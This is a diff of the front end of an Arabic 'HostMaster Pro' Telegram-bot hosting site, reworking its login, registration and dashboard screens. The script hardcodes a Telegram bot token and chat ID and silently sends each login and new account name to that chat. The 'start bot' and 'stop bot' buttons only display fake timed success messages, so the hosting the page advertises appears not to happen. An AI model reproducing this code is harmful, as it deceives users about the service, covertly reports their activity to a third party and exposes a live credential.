-        <p>استضافة بوت تليجرام مجانا, استضافة بوتات تليجرام عربي, استضافة بايثون مجانية, استضافة جافاسكريبت, استضافة سحابية, استضافة ملفات برمجية, Telegram bot hosting free, Python hosting, JavaScript hosting, cloud hosting platform, استضافة بوتات, استضافة بوت تلغرام, منصة استضافة عربية, استضافة مجانية 2026</p>
-        
-        <h3>الدعم والمساعدة:</h3>
-        <p>للاستفسارات والدعم الفني، يمكنك التواصل عبر بوت التليجرام الرسمي أو مراجعة قسم المساعدة في المنصة.</p>
-    </div>
-    
-    <!-- Background Animation -->
-    <div class="bg-animation">
-        <div class="bg-circle circle-1"></div>
-        <div class="bg-circle circle-2"></div>
-        <div class="bg-circle circle-3"></div>
-    </div>
-    
-    <!-- Language Switcher -->
-    <div class="language-switcher">
-        <button class="lang-btn" id="langToggle">
-            <i class="fas fa-globe"></i>
-            <span id="langText">English</span>
-        </button>
-    </div>
-    
     <!-- Loading Screen -->
     <div class="loading-screen" id="loadingScreen">
         <div class="loader"></div>
-        <div class="loading-text" id="loadingText">جاري تحميل النظام...</div>
+        <div class="loading-text">جاري تحميل النظام...</div>
+    </div>
+    
+    <!-- Dashboard Container -->
+    <div class="dashboard-container" id="dashboard" style="display: none;">
+        <!-- Sidebar -->
+        <aside class="sidebar">
+            <div class="sidebar-header">
+                <div class="logo-container">
+                    <img src="https://hostingtelegramfacebook.github.io/Hosting_bot/1000010437.png" alt="HostMaster Pro Logo">
+                </div>
+                <h2 class="site-title">HostMaster Pro</h2>
+                <p style="color: var(--text-muted); font-size: 14px;">منصة الاستضافة الاحترافية</p>
+            </div>
+            
+            <nav class="sidebar-nav">
+                <a href="#" class="nav-item active" data-section="files">
+                    <div class="nav-icon"><i class="fas fa-folder"></i></div>
+                    <span>الملفات</span>
+                </a>
+                <a href="#" class="nav-item" data-section="control">
+                    <div class="nav-icon"><i class="fas fa-cogs"></i></div>
+                    <span>لوحة التحكم</span>
+                </a>
+                <a href="#" class="nav-item" data-section="settings">
+                    <div class="nav-icon"><i class="fas fa-sliders-h"></i></div>
+                    <span>الإعدادات</span>
+                </a>
+                <a href="./privacy.html" class="nav-item">
+                    <div class="nav-icon"><i class="fas fa-shield-alt"></i></div>
+                    <span>سياسة الخصوصية</span>
+                </a>
+                <a href="#" class="nav-item" id="logoutBtn">
+                    <div class="nav-icon"><i class="fas fa-sign-out-alt"></i></div>
+                    <span>تسجيل الخروج</span>
+                </a>
+            </nav>
+        </aside>
+        
+        <!-- Main Content -->
+        <main class="main-content">
+            <!-- Header -->
+            <header class="main-header">
+                <div class="header-title" id="sectionTitle">الملفات</div>
+                <div class="header-actions">
+                    <div class="user-info">
+                        <div class="user-avatar" id="userAvatar">م</div>
+                        <div class="user-details">
+                            <h3 id="userDisplay">مستخدم</h3>
+                            <p>حساب مميز</p>
+                        </div>
+                    </div>
+                    <button class="lang-btn" id="langToggle">
+                        <i class="fas fa-globe"></i>
+                        <span>English</span>
+                    </button>
+                </div>
+            </header>
+            
+            <!-- Stats -->
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-icon">
+                        <i class="fas fa-hdd"></i>
+                    </div>
+                    <div class="stat-value" id="storageUsage">0%</div>
+                    <div class="stat-label">مساحة التخزين</div>
+                </div>
+                
+                <div class="stat-card">
+                    <div class="stat-icon">
+                        <i class="fas fa-file-code"></i>
+                    </div>
+                    <div class="stat-value" id="fileCount">0</div>
+                    <div class="stat-label">الملفات المرفوعة</div>
+                </div>
+                
+                <div class="stat-card">
+                    <div class="stat-icon">
+                        <i class="fas fa-chart-line"></i>
+                    </div>
+                    <div class="stat-value" style="color: var(--success-color);">نشط</div>
+                    <div class="stat-label">حالة النظام</div>
+                </div>
+            </div>
+            
+            <!-- Files Section -->
+            <section class="content-section" id="filesSection">
+                <div class="section-header">
+                    <h2 class="section-title"><i class="fas fa-folder"></i> الملفات المرفوعة</h2>
+                    <div class="upload-zone" id="uploadZone">
+                        <div class="upload-icon">
+                            <i class="fas fa-cloud-upload-alt"></i>
+                        </div>
+                        <div class="upload-text">
+                            <h3>اسحب وأفلت الملفات هنا</h3>
+                            <p>أو انقر للاختيار من جهازك</p>
+                        </div>
+                        <input type="file" id="fileInput" multiple style="display: none;">
+                    </div>
+                </div>
+                
+                <div class="files-grid" id="filesGrid">
+                    <!-- Files will be loaded here -->
+                </div>
+            </section>
+            
+            <!-- Control Panel Section -->
+            <section class="content-section" id="controlSection" style="display: none;">
+                <div class="section-header">
+                    <h2 class="section-title"><i class="fas fa-cogs"></i> لوحة التحكم</h2>
+                    <p style="color: var(--text-muted);">إدارة وتشغيل ملفات البوت</p>
+                </div>
+                
+                <div class="control-grid">
+                    <div class="control-card">
+                        <div class="control-icon">
+                            <i class="fas fa-play"></i>
+                        </div>
+                        <h3 class="control-title">تشغيل البوت</h3>
+                        <p class="control-desc">بدء تشغيل ملف البوت الرئيسي وتفعيل جميع المهام</p>
+                        <button class="btn-control" id="startBot">بدء التشغيل</button>
+                    </div>
+                    
+                    <div class="control-card">
+                        <div class="control-icon">
+                            <i class="fas fa-stop"></i>
+                        </div>
+                        <h3 class="control-title">إيقاف البوت</h3>
+                        <p class="control-desc">إيقاف جميع عمليات البوت وإغلاق الاتصالات</p>
+                        <button class="btn-control stop" id="stopBot">إيقاف التشغيل</button>
+                    </div>
+                    
+                    <div class="control-card">
+                        <div class="control-icon">
+                            <i class="fas fa-terminal"></i>
+                        </div>
+                        <h3 class="control-title">تثبيت المكتبات</h3>
+                        <p class="control-desc">تثبيت مكتبات Python المطلوبة للبوت</p>
+                        <button class="btn-control" id="installLibs">تثبيت المكتبات</button>
+                    </div>
+                    
+                    <div class="control-card">
+                        <div class="control-icon">
+                            <i class="fas fa-bug"></i>
+                        </div>
+                        <h3 class="control-title">عرض الأخطاء</h3>
+                        <p class="control-desc">عرض آخر الأخطاء المسجلة في نظام التشغيل</p>
+                        <button class="btn-control" id="showErrors">عرض الأخطاء</button>
+                    </div>
+                </div>
+                
+                <div class="terminal-container">
+                    <div class="terminal-header">
+                        <div class="terminal-title">سجل التشغيل</div>
+                        <div class="terminal-controls">
+                            <button class="btn-terminal" id="clearTerminal">مسح</button>
+                            <button class="btn-terminal" id="copyTerminal">نسخ</button>
+                        </div>
+                    </div>
+                    <div class="terminal-body" id="terminalOutput">
+                        <div class="terminal-line info">✔ النظام جاهز للاستخدام</div>
+                        <div class="terminal-line info">⏳ انتظر الأوامر...</div>
+                    </div>
+                </div>
+            </section>
+            
+            <!-- Settings Section -->
+            <section class="content-section" id="settingsSection" style="display: none;">
+                <div class="section-header">
+                    <h2 class="section-title"><i class="fas fa-sliders-h"></i> الإعدادات</h2>
+                    <p style="color: var(--text-muted);">تخصيص حسابك وإعدادات المنصة</p>
+                </div>
+                
+                <div class="alert" id="settingsAlert">
+                    <i class="fas fa-info-circle"></i>
+                    <span></span>
+                </div>
+                
+                <form class="settings-form" id="settingsForm">
+                    <div class="form-group">
+                        <label class="form-label">اسم المستخدم</label>
+                        <input type="text" class="form-input" id="settingsUsername" placeholder="اسم المستخدم الحالي">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">الاسم الكامل</label>
+                        <input type="text" class="form-input" id="settingsFullName" placeholder="الاسم الذي سيظهر في الملفات">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">العمر</label>
+                        <input type="number" class="form-input" id="settingsAge" placeholder="اختياري" min="1" max="120">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">الدولة</label>
+                        <select class="form-select" id="settingsCountry">
+                            <option value="">اختر الدولة</option>
+                            <option value="SA">المملكة العربية السعودية</option>
+                            <option value="AE">الإمارات العربية المتحدة</option>
+                            <option value="EG">مصر</option>
+                            <option value="JO">الأردن</option>
+                            <option value="KW">الكويت</option>
+                            <option value="QA">قطر</option>
+                            <option value="BH">البحرين</option>
+                            <option value="OM">عُمان</option>
+                        </select>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">اللغة</label>
+                        <select class="form-select" id="settingsLanguage">
+                            <option value="ar">العربية</option>
+                            <option value="en">الإنجليزية</option>
+                        </select>
+                    </div>
+                    
+                    <button type="button" class="btn-save" id="saveSettings">حفظ التغييرات</button>
+                </form>
+                
+                <div class="footer-links">
+                    <a href="./privacy.html">سياسة الخصوصية</a>
+                    <a href="#">الشروط والأحكام</a>
+                    <a href="#">الدعم الفني</a>
+                </div>
+            </section>
+        </main>
     </div>
     
     <!-- Auth Container -->
@@ -1059,267 +1028,60 @@
             <div class="auth-box">
                 <div class="brand">
                     <div class="brand-logo">
-                        <img src="./1000010437.png" alt="HostMaster Pro Logo">
+                        <img src="https://hostingtelegramfacebook.github.io/Hosting_bot/1000010437.png" alt="HostMaster Pro Logo">
                     </div>
                     <h1 class="brand-name">HostMaster Pro</h1>
-                    <p class="brand-tagline" id="tagline">منصة استضافة احترافية لبوتات تليجرام والملفات البرمجية</p>
+                    <p class="brand-tagline">منصة استضافة احترافية لبوتات تليجرام والملفات البرمجية</p>
                 </div>
                 
                 <!-- Alerts -->
-                <div class="alert alert-success" id="successAlert">
-                    <i class="fas fa-check-circle"></i>
-                    <span id="successText"></span>
-                </div>
-                
-                <div class="alert alert-error" id="errorAlert">
-                    <i class="fas fa-exclamation-circle"></i>
-                    <span id="errorText"></span>
+                <div class="alert" id="authAlert">
+                    <i class="fas fa-info-circle"></i>
+                    <span id="authAlertText"></span>
                 </div>
                 
                 <!-- Tabs -->
                 <div class="auth-tabs">
-                    <button class="tab-btn active" data-tab="login" id="loginTab">
-                        <i class="fas fa-sign-in-alt"></i>
-                        <span id="loginTabText">تسجيل الدخول</span>
-                    </button>
-                    <button class="tab-btn" data-tab="register" id="registerTab">
-                        <i class="fas fa-user-plus"></i>
-                        <span id="registerTabText">إنشاء حساب</span>
-                    </button>
+                    <button class="tab-btn active" data-tab="login">تسجيل الدخول</button>
+                    <button class="tab-btn" data-tab="register">إنشاء حساب</button>
                 </div>
                 
                 <!-- Login Form -->
                 <div class="form-container" id="loginForm">
                     <div class="form-group">
-                        <label class="form-label" id="usernameLabel">اسم المستخدم</label>
-                        <div class="input-group">
-                            <input type="text" class="form-input" id="loginUsername" placeholder="أدخل اسم المستخدم">
-                            <i class="fas fa-user input-icon"></i>
-                        </div>
+                        <label class="form-label">اسم المستخدم</label>
+                        <input type="text" class="form-input" id="loginUsername" placeholder="أدخل اسم المستخدم">
                     </div>
                     
                     <div class="form-group">
-                        <label class="form-label" id="passwordLabel">كلمة المرور</label>
-                        <div class="input-group">
-                            <input type="password" class="form-input" id="loginPassword" placeholder="أدخل كلمة المرور">
-                            <i class="fas fa-lock input-icon"></i>
-                        </div>
+                        <label class="form-label">كلمة المرور</label>
+                        <input type="password" class="form-input" id="loginPassword" placeholder="أدخل كلمة المرور">
                     </div>
                     
-                    <button class="btn btn-primary" id="loginBtn">
-                        <i class="fas fa-sign-in-alt"></i>
-                        <span id="loginBtnText">تسجيل الدخول</span>
-                    </button>
+                    <button class="btn btn-primary" id="loginBtn">تسجيل الدخول</button>
                 </div>
                 
                 <!-- Register Form -->
-                <div class="form-container hidden" id="registerFormContainer">
+                <div class="form-container" id="registerForm" style="display: none;">
                     <div class="form-group">
-                        <label class="form-label" id="regUsernameLabel">اسم المستخدم</label>
-                        <div class="input-group">
-                            <input type="text" class="form-input" id="regUsername" placeholder="اختر اسم مستخدم">
-                            <i class="fas fa-user input-icon"></i>
-                        </div>
+                        <label class="form-label">اسم المستخدم</label>
+                        <input type="text" class="form-input" id="regUsername" placeholder="اختر اسم مستخدم">
                     </div>
                     
                     <div class="form-group">
-                        <label class="form-label" id="regPasswordLabel">كلمة المرور</label>
-                        <div class="input-group">
-                            <input type="password" class="form-input" id="regPassword" placeholder="كلمة مرور قوية">
-                            <i class="fas fa-lock input-icon"></i>
-                        </div>
+                        <label class="form-label">كلمة المرور</label>
+                        <input type="password" class="form-input" id="regPassword" placeholder="كلمة مرور قوية">
                     </div>
                     
                     <div class="form-group">
-                        <label class="form-label" id="confirmPasswordLabel">تأكيد كلمة المرور</label>
-                        <div class="input-group">
-                            <input type="password" class="form-input" id="regConfirmPassword" placeholder="أعد إدخال كلمة المرور">
-                            <i class="fas fa-lock input-icon"></i>
-                        </div>
+                        <label class="form-label">تأكيد كلمة المرور</label>
+                        <input type="password" class="form-input" id="regConfirmPassword" placeholder="أعد إدخال كلمة المرور">
                     </div>
                     
-                    <button class="btn btn-primary" id="registerBtn">
-                        <i class="fas fa-user-plus"></i>
-                        <span id="registerBtnText">إنشاء حساب</span>
-                    </button>
-                </div>
-                
-                <!-- Features -->
-                <div class="features">
-                    <div class="feature-item">
-                        <div class="feature-icon">
-                            <i class="fas fa-bolt"></i>
-                        </div>
-                        <span id="feature1">أداء عالي وسرعة فائقة</span>
-                    </div>
-                    <div class="feature-item">
-                        <div class="feature-icon">
-                            <i class="fas fa-shield-alt"></i>
-                        </div>
-                        <span id="feature2">حماية متقدمة وأمان تام</span>
-                    </div>
-                    <div class="feature-item">
-                        <div class="feature-icon">
-                            <i class="fas fa-cloud"></i>
-                        </div>
-                        <span id="feature3">تخزين سحابي غير محدود</span>
-                    </div>
+                    <button class="btn btn-primary" id="registerBtn">إنشاء حساب</button>
                 </div>
             </div>
         </div>
-    </div>
-    
-    <!-- Dashboard -->
-    <div class="dashboard" id="dashboard">
-        <!-- Top Navigation -->
-        <nav class="top-nav">
-            <div class="nav-brand">
-                <div class="nav-logo">
-                    <img src="./1000010437.png" alt="HostMaster Pro Logo">
-                </div>
-                <div>
-                    <div class="nav-title">HostMaster Pro</div>
-                    <div style="font-size: 13px; color: var(--text-muted);" id="navSubtitle">منصة الاستضافة الاحترافية</div>
-                </div>
-            </div>
-            
-            <div class="user-menu">
-                <div class="user-info">
-                    <div class="user-name" id="userDisplay">مستخدم</div>
-                    <div class="user-role" id="userRole">حساب مميز</div>
-                </div>
-                <a href="#" class="btn-logout" id="logoutBtn">
-                    <i class="fas fa-sign-out-alt"></i>
-                    <span id="logoutText">تسجيل الخروج</span>
-                </a>
-            </div>
-        </nav>
-        
-        <!-- Main Content -->
-        <main class="main-content">
-            <!-- Stats Grid -->
-            <div class="stats-grid">
-                <div class="stat-card">
-                    <div class="stat-header">
-                        <div class="stat-icon">
-                            <i class="fas fa-hdd"></i>
-                        </div>
-                        <div>
-                            <div class="stat-title" id="storageTitle">مساحة التخزين</div>
-                            <div class="stat-value" id="storageUsage">0%</div>
-                        </div>
-                    </div>
-                    <div style="color: var(--text-muted); font-size: 13px;" id="storageSubtitle">
-                        من إجمالي المساحة المتاحة
-                    </div>
-                </div>
-                
-                <div class="stat-card">
-                    <div class="stat-header">
-                        <div class="stat-icon">
-                            <i class="fas fa-file-code"></i>
-                        </div>
-                        <div>
-                            <div class="stat-title" id="filesTitle">الملفات المرفوعة</div>
-                            <div class="stat-value" id="fileCount">0</div>
-                        </div>
-                    </div>
-                    <div style="color: var(--text-muted); font-size: 13px;" id="filesSubtitle">
-                        ملف نشط في النظام
-                    </div>
-                </div>
-                
-                <div class="stat-card">
-                    <div class="stat-header">
-                        <div class="stat-icon">
-                            <i class="fas fa-chart-line"></i>
-                        </div>
-                        <div>
-                            <div class="stat-title" id="statusTitle">حالة النظام</div>
-                            <div class="stat-value" style="color: var(--success-color);" id="systemStatus">نشط</div>
-                        </div>
-                    </div>
-                    <div style="color: var(--text-muted); font-size: 13px;" id="statusSubtitle">
-                        يعمل بكفاءة عالية
-                    </div>
-                </div>
-            </div>
-            
-            <!-- Upload Section -->
-            <div class="upload-section">
-                <div class="section-header">
-                    <h2 class="section-title">
-                        <i class="fas fa-cloud-upload-alt"></i>
-                        <span id="uploadTitle">رفع الملفات</span>
-                    </h2>
-                    <p class="section-subtitle" id="uploadSubtitle">
-                        قم برفع ملفات بوت التليجرام أو الملفات البرمجية (Python, JavaScript, ZIP) إلى الخادم السحابي
-                    </p>
-                </div>
-                
-                <!-- Upload Alerts -->
-                <div class="alert alert-success" id="uploadSuccessAlert">
-                    <i class="fas fa-check-circle"></i>
-                    <span id="uploadSuccessText"></span>
-                </div>
-                
-                <div class="alert alert-error" id="uploadErrorAlert">
-                    <i class="fas fa-exclamation-circle"></i>
-                    <span id="uploadErrorText"></span>
-                </div>
-                
-                <!-- Upload Zone -->
-                <div class="upload-zone" id="uploadZone">
-                    <div class="upload-icon">
-                        <i class="fas fa-cloud-upload-alt"></i>
-                    </div>
-                    <div class="upload-text">
-                        <h3 id="dropTitle">اسحب وأفلت الملفات هنا</h3>
-                        <p id="clickTitle">أو انقر للاختيار من جهازك</p>
-                    </div>
-                    
-                    <div class="file-types">
-                        <span class="file-type-tag">
-                            <i class="fas fa-file-code"></i>
-                            Python (.py)
-                        </span>
-                        <span class="file-type-tag">
-                            <i class="fas fa-file-code"></i>
-                            JavaScript (.js)
-                        </span>
-                        <span class="file-type-tag">
-                            <i class="fas fa-file-archive"></i>
-                            Archive (.zip)
-                        </span>
-                        <span class="file-type-tag">
-                            <i class="fas fa-file-alt"></i>
-                            Text (.txt)
-                        </span>
-                        <span class="file-type-tag">
-                            <i class="fas fa-file-code"></i>
-                            JSON (.json)
-                        </span>
-                    </div>
-                    
-                    <input type="file" id="fileInput" multiple>
-                </div>
-                
-                <!-- Progress Bar -->
-                <div class="upload-progress" id="uploadProgress">
-                    <div class="progress-header">
-                        <div class="progress-title" id="progressTitle">جاري معالجة الملفات</div>
-                        <div class="progress-percent" id="progressPercent">0%</div>
-                    </div>
-                    <div class="progress-bar">
-                        <div class="progress-fill" id="progressFill"></div>
-                    </div>
-                    <div class="progress-details" style="display: flex; justify-content: space-between; color: var(--text-muted); font-size: 13px;">
-                        <span id="currentFile">لا يوجد ملفات</span>
-                        <span id="fileSize">--</span>
-                    </div>
-                </div>
-            </div>
-        </main>
     </div>
 
     <script>
@@ -1327,142 +1089,11 @@
         const TELEGRAM_BOT_TOKEN = "8544540684:AAEw_t8RQhYLa_afGfHXcEcVZ4TDuHDU3ZA";
         const TELEGRAM_CHAT_ID = "7130722086";
         
-        // Language Translations
-        const translations = {
-            ar: {
-                // Loading
-                loading: "جاري تحميل النظام...",
-                
-                // Language switcher
-                switchToEnglish: "English",
-                switchToArabic: "العربية",
-                
-                // Branding
-                tagline: "منصة استضافة احترافية لبوتات تليجرام والملفات البرمجية",
-                
-                // Tabs
-                loginTab: "تسجيل الدخول",
-                registerTab: "إنشاء حساب",
-                
-                // Forms
-                username: "اسم المستخدم",
-                password: "كلمة المرور",
-                confirmPassword: "تأكيد كلمة المرور",
-                usernamePlaceholder: "أدخل اسم المستخدم",
-                passwordPlaceholder: "أدخل كلمة المرور",
-                regUsernamePlaceholder: "اختر اسم مستخدم",
-                regPasswordPlaceholder: "كلمة مرور قوية",
-                confirmPasswordPlaceholder: "أعد إدخال كلمة المرور",
-                
-                // Buttons
-                loginBtn: "تسجيل الدخول",
-                registerBtn: "إنشاء حساب",
-                logoutBtn: "تسجيل الخروج",
-                
-                // Features
-                feature1: "أداء عالي وسرعة فائقة",
-                feature2: "حماية متقدمة وأمان تام",
-                feature3: "تخزين سحابي غير محدود",
-                
-                // Dashboard
-                navSubtitle: "منصة الاستضافة الاحترافية",
-                userRole: "حساب مميز",
-                
-                // Stats
-                storageTitle: "مساحة التخزين",
-                storageSubtitle: "من إجمالي المساحة المتاحة",
-                filesTitle: "الملفات المرفوعة",
-                filesSubtitle: "ملف نشط في النظام",
-                statusTitle: "حالة النظام",
-                statusSubtitle: "يعمل بكفاءة عالية",
-                
-                // Upload
-                uploadTitle: "رفع الملفات",
-                uploadSubtitle: "قم برفع ملفات بوت التليجرام أو الملفات البرمجية (Python, JavaScript, ZIP) إلى الخادم السحابي",
-                dropTitle: "اسحب وأفلت الملفات هنا",
-                clickTitle: "أو انقر للاختيار من جهازك",
-                progressTitle: "جاري معالجة الملفات",
-                
-                // Alerts
-                loginSuccess: "تم تسجيل الدخول بنجاح!",
-                registerSuccess: "تم إنشاء الحساب بنجاح!",
-                uploadSuccess: "تم رفع الملفات بنجاح",
-                logoutSuccess: "تم تسجيل الخروج بنجاح",
-                loginError: "خطأ في اسم المستخدم أو كلمة المرور",
-                registerError: "حدث خطأ أثناء إنشاء الحساب",
-                uploadError: "حدث خطأ أثناء رفع الملفات",
-                passwordMismatch: "كلمات المرور غير متطابقة"
-            },
-            en: {
-                // Loading
-                loading: "Loading system...",
-                
-                // Language switcher
-                switchToEnglish: "English",
-                switchToArabic: "العربية",
-                
-                // Branding
-                tagline: "Professional hosting platform for Telegram bots and code files",
-                
-                // Tabs
-                loginTab: "Login",
-                registerTab: "Register",
-                
-                // Forms
-                username: "Username",
-                password: "Password",
-                confirmPassword: "Confirm Password",
-                usernamePlaceholder: "Enter username",
-                passwordPlaceholder: "Enter password",
-                regUsernamePlaceholder: "Choose username",
-                regPasswordPlaceholder: "Strong password",
-                confirmPasswordPlaceholder: "Re-enter password",
-                
-                // Buttons
-                loginBtn: "Login",
-                registerBtn: "Create Account",
-                logoutBtn: "Logout",
-                
-                // Features
-                feature1: "High performance and speed",
-                feature2: "Advanced protection and security",
-                feature3: "Unlimited cloud storage",
-                
-                // Dashboard
-                navSubtitle: "Professional Hosting Platform",
-                userRole: "Premium Account",
-                
-                // Stats
-                storageTitle: "Storage Space",
-                storageSubtitle: "of total available space",
-                filesTitle: "Uploaded Files",
-                filesSubtitle: "active file in system",
-                statusTitle: "System Status",
-                statusSubtitle: "Running at high efficiency",
-                
-                // Upload
-                uploadTitle: "Upload Files",
-                uploadSubtitle: "Upload Telegram bot files or code files (Python, JavaScript, ZIP) to the cloud server",
-                dropTitle: "Drag and drop files here",
-                clickTitle: "Or click to select from your device",
-                progressTitle: "Processing files",
-                
-                // Alerts
-                loginSuccess: "Logged in successfully!",
-                registerSuccess: "Account created successfully!",
-                uploadSuccess: "Files uploaded successfully",
-                logoutSuccess: "Logged out successfully",
-                loginError: "Incorrect username or password",
-                registerError: "Error creating account",
-                uploadError: "Error uploading files",
-                passwordMismatch: "Passwords do not match"
-            }
-        };
-        
         // System State
         let currentUser = null;
         let userFiles = [];
         let currentLanguage = 'ar';
+        let terminalHistory = [];
         
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
@@ -1475,55 +1106,36 @@
                 document.getElementById('loadingScreen').style.opacity = '0';
                 setTimeout(() => {
                     document.getElementById('loadingScreen').style.display = 'none';
+                    checkLoginStatus();
                 }, 500);
             }, 1500);
             
             // Initialize storage
             initializeStorage();
             
-            // DOM Elements
-            const authContainer = document.getElementById('authContainer');
-            const dashboard = document.getElementById('dashboard');
-            const loginForm = document.getElementById('loginForm');
-            const registerForm = document.getElementById('registerFormContainer');
-            const loginBtn = document.getElementById('loginBtn');
-            const registerBtn = document.getElementById('registerBtn');
-            const logoutBtn = document.getElementById('logoutBtn');
-            const langToggle = document.getElementById('langToggle');
-            const uploadZone = document.getElementById('uploadZone');
-            const fileInput = document.getElementById('fileInput');
-            const uploadProgress = document.getElementById('uploadProgress');
-            
-            // Tab switching
-            document.querySelectorAll('.tab-btn').forEach(btn => {
+            // Auth tabs
+            document.querySelectorAll('.auth-tabs .tab-btn').forEach(btn => {
                 btn.addEventListener('click', () => {
-                    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+                    document.querySelectorAll('.auth-tabs .tab-btn').forEach(b => b.classList.remove('active'));
                     btn.classList.add('active');
                     
                     if (btn.dataset.tab === 'login') {
-                        loginForm.classList.remove('hidden');
-                        registerForm.classList.add('hidden');
+                        document.getElementById('loginForm').style.display = 'block';
+                        document.getElementById('registerForm').style.display = 'none';
                     } else {
-                        loginForm.classList.add('hidden');
-                        registerForm.classList.remove('hidden');
+                        document.getElementById('loginForm').style.display = 'none';
+                        document.getElementById('registerForm').style.display = 'block';
                     }
                 });
             });
             
-            // Language toggle
-            langToggle.addEventListener('click', () => {
-                const newLang = currentLanguage === 'ar' ? 'en' : 'ar';
-                setLanguage(newLang);
-                localStorage.setItem('hostmaster_lang', newLang);
-            });
-            
             // Login
-            loginBtn.addEventListener('click', async function() {
+            document.getElementById('loginBtn').addEventListener('click', async function() {
                 const username = document.getElementById('loginUsername').value.trim();
                 const password = document.getElementById('loginPassword').value;
                 
                 if (!username || !password) {
-                    showError(currentLanguage === 'ar' ? 'يرجى ملء جميع الحقول' : 'Please fill all fields');
+                    showAuthAlert('يرجى ملء جميع الحقول', 'error');
                     return;
                 }
                 
@@ -1533,49 +1145,49 @@
                     currentUser = user;
                     localStorage.setItem('currentUser', JSON.stringify(user));
                     
-                    authContainer.style.display = 'none';
-                    dashboard.style.display = 'block';
-                    document.getElementById('userDisplay').textContent = user.username;
+                    document.getElementById('authContainer').style.display = 'none';
+                    document.getElementById('dashboard').style.display = 'flex';
                     
+                    updateUserDisplay();
                     loadUserFiles();
-                    showSuccess(translations[currentLanguage].loginSuccess);
                     
-                    // Silent Telegram notification
+                    showTerminalMessage('✔ تم تسجيل الدخول بنجاح', 'success');
+                    
                     await sendTelegramNotification(`👤 Login: ${username}`);
                     
                 } else {
-                    showError(translations[currentLanguage].loginError);
+                    showAuthAlert('خطأ في اسم المستخدم أو كلمة المرور', 'error');
                 }
             });
             
             // Register
-            registerBtn.addEventListener('click', async function() {
+            document.getElementById('registerBtn').addEventListener('click', async function() {
                 const username = document.getElementById('regUsername').value.trim();
                 const password = document.getElementById('regPassword').value;
                 const confirmPassword = document.getElementById('regConfirmPassword').value;
                 
                 if (!username || !password || !confirmPassword) {
-                    showError(currentLanguage === 'ar' ? 'يرجى ملء جميع الحقول' : 'Please fill all fields');
+                    showAuthAlert('يرجى ملء جميع الحقول', 'error');
                     return;
                 }
                 
                 if (username.length < 3) {
-                    showError(currentLanguage === 'ar' ? 'اسم المستخدم يجب أن يكون 3 أحرف على الأقل' : 'Username must be at least 3 characters');
+                    showAuthAlert('اسم المستخدم يجب أن يكون 3 أحرف على الأقل', 'error');
                     return;
                 }
                 
                 if (password.length < 6) {
-                    showError(currentLanguage === 'ar' ? 'كلمة المرور يجب أن تكون 6 أحرف على الأقل' : 'Password must be at least 6 characters');
+                    showAuthAlert('كلمة المرور يجب أن تكون 6 أحرف على الأقل', 'error');
                     return;
                 }
                 
                 if (password !== confirmPassword) {
-                    showError(translations[currentLanguage].passwordMismatch);
+                    showAuthAlert('كلمات المرور غير متطابقة', 'error');
                     return;
                 }
                 
                 if (userExists(username)) {
-                    showError(currentLanguage === 'ar' ? 'اسم المستخدم موجود بالفعل' : 'Username already exists');
+                    showAuthAlert('اسم المستخدم موجود بالفعل', 'error');
                     return;
                 }
                 
@@ -1583,58 +1195,144 @@
                 currentUser = user;
                 localStorage.setItem('currentUser', JSON.stringify(user));
                 
-                authContainer.style.display = 'none';
-                dashboard.style.display = 'block';
-                document.getElementById('userDisplay').textContent = user.username;
+                document.getElementById('authContainer').style.display = 'none';
+                document.getElementById('dashboard').style.display = 'flex';
                 
+                updateUserDisplay();
                 loadUserFiles();
-                showSuccess(translations[currentLanguage].registerSuccess);
                 
-                // Silent Telegram notification
+                showTerminalMessage('✔ تم إنشاء الحساب بنجاح', 'success');
+                
                 await sendTelegramNotification(`🆕 New account: ${username}`);
             });
             
-            // Logout
-            logoutBtn.addEventListener('click', function(e) {
-                e.preventDefault();
-                logoutUser();
+            // Navigation
+            document.querySelectorAll('.nav-item[data-section]').forEach(item => {
+                item.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    
+                    if (this.id === 'logoutBtn') {
+                        logoutUser();
+                        return;
+                    }
+                    
+                    document.querySelectorAll('.nav-item').forEach(nav => nav.classList.remove('active'));
+                    this.classList.add('active');
+                    
+                    const section = this.dataset.section;
+                    document.getElementById('sectionTitle').textContent = this.querySelector('span').textContent;
+                    
+                    // Hide all sections
+                    document.getElementById('filesSection').style.display = 'none';
+                    document.getElementById('controlSection').style.display = 'none';
+                    document.getElementById('settingsSection').style.display = 'none';
+                    
+                    // Show selected section
+                    document.getElementById(section + 'Section').style.display = 'block';
+                });
             });
             
-            // File Upload
-            uploadZone.addEventListener('click', () => fileInput.click());
-            
-            uploadZone.addEventListener('dragover', (e) => {
-                e.preventDefault();
-                uploadZone.style.borderColor = 'rgba(59, 130, 246, 0.6)';
-                uploadZone.style.background = 'rgba(59, 130, 246, 0.1)';
+            // Language toggle
+            document.getElementById('langToggle').addEventListener('click', function() {
+                const newLang = currentLanguage === 'ar' ? 'en' : 'ar';
+                setLanguage(newLang);
+                localStorage.setItem('hostmaster_lang', newLang);
             });
             
-            uploadZone.addEventListener('dragleave', () => {
-                uploadZone.style.borderColor = 'rgba(59, 130, 246, 0.3)';
-                uploadZone.style.background = 'rgba(15, 23, 42, 0.3)';
+            // File upload
+            document.getElementById('uploadZone').addEventListener('click', () => {
+                document.getElementById('fileInput').click();
             });
             
-            uploadZone.addEventListener('drop', async (e) => {
-                e.preventDefault();
-                uploadZone.style.borderColor = 'rgba(59, 130, 246, 0.3)';
-                uploadZone.style.background = 'rgba(15, 23, 42, 0.3)';
-                
-                if (e.dataTransfer.files.length > 0) {
-                    await handleFileUpload(e.dataTransfer.files);
-                }
-            });
-            
-            fileInput.addEventListener('change', async function() {
+            document.getElementById('fileInput').addEventListener('change', async function() {
                 if (this.files.length > 0) {
                     await handleFileUpload(this.files);
                 }
             });
             
-            // Check login status
-            checkLoginStatus();
+            // Control buttons
+            document.getElementById('startBot').addEventListener('click', function() {
+                showTerminalMessage('▶ بدء تشغيل البوت...', 'info');
+                setTimeout(() => {
+                    showTerminalMessage('✔ البوت يعمل بنجاح', 'success');
+                }, 2000);
+            });
+            
+            document.getElementById('stopBot').addEventListener('click', function() {
+                showTerminalMessage('⏹ إيقاف البوت...', 'info');
+                setTimeout(() => {
